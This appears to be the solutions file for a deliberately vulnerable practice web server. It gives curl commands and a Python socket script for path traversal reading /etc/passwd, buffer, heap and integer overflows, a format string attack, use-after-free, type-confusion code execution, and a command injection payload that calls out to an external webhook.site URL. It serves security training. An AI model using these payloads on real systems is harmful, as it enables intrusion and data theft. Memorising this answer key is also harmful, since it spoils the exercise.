### Solutions

### Path Traversal

```
curl --path-as-is "http://127.0.0.1:8081/../../../../../../../etc/passwd"
```

### Buffer Overflow

```
curl --path-as-is "http://127.0.0.1:8081/$(python3 -c 'print("A"*300)')"
```

### Command Injection 

```
example request
curl "http://127.0.0.1:8081/logs?filter=200"
```

```
command injection payload
`curl "http://127.0.0.1:8081/logs?filter=foobar%20/tmp/server.log;curl%20https://webhook.site/d5e64a1e-9c6c-4891-ae79-a79e7e9012bd%20&&%20cat"

```

### Format String Attack 

```
curl "http://127.0.0.1:8081/echo.php?input=%p%p%p"
```

### Insecure Temp File Creation 

```
curl -i http://127.0.0.1:8081/echo.php`
```

check /tmp folder to when php file is created, this can be modified
```
while true; do php_file=$(ls /tmp/php_script_*.php 2>/dev/null); if [ -n "$php_file" ]; then cat "$php_file"; break; fi; sleep 1; done
```

### Use-After-Free (Logger Config)

This vulnerability allows an attacker to manipulate the heap by allocating and freeing a logger configuration object.

1. **Allocate**: Authenticate as admin and set a custom log format.
```bash
curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=set&format=heap_grooming"
```

2. **Free**: Reset the configuration. This frees the memory but leaves a dangling pointer.
```bash
curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=reset"
```

3. **Trigger**: Any subsequent request will cause the server to use the dangling pointer. If the memory has been reallocated (e.g., via Base64 decoding in the Authorization header), this can lead to RCE.
```bash
curl "http://127.0.0.1:8081/"
```

### Heap Overflow (System Status)

This vulnerability allows an attacker to overwrite heap metadata by sending a large status message to a fixed-size buffer.

1. **Trigger**: Authenticate as admin and send a large POST body to the status endpoint.
```bash
curl -u admin:admin -X POST "http://127.0.0.1:8081/admin/system_status" -d "status=$(python3 -c 'print("A"*100)')"
```
The server allocates 32 bytes but blindly copies the entire input, corrupting the heap.

### Integer Overflow (File Upload)

This vulnerability causes a massive heap overflow due to an integer wraparound in the buffer size calculation.

1. **Trigger**: Send a request with a `Content-Length` that wraps around when added to the internal overhead (e.g., `UINT_MAX - 63`).
```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 8081))
# 4294967295 + 64 = 63. Allocates 63 bytes, writes huge amount.
payload = b"POST /admin/upload_file HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Length: 4294967295\r\n\r\n" + b"A"*1000
s.send(payload)
```

### Type Confusion (Rule Engine)

This vulnerability allows an attacker to gain RCE by confusing an `AliasRule` (containing a string) with an `ExecRule` (containing a function pointer).

1. **Create Malicious Alias**: Add an alias where the `target` string contains the address you want to execute (e.g., `AAAAAAAA` for `0x4141414141414141`).
```bash
curl -u admin:admin "http://127.0.0.1:8081/admin/add_rule?type=alias&path=/cgi-bin/exploit&target=AAAAAAAA"
```

2. **Trigger**: Request the path. The server assumes everything in `/cgi-bin/` is an `ExecRule` and jumps to the address in your target string.
```bash
curl "http://127.0.0.1:8081/cgi-bin/exploit"
```
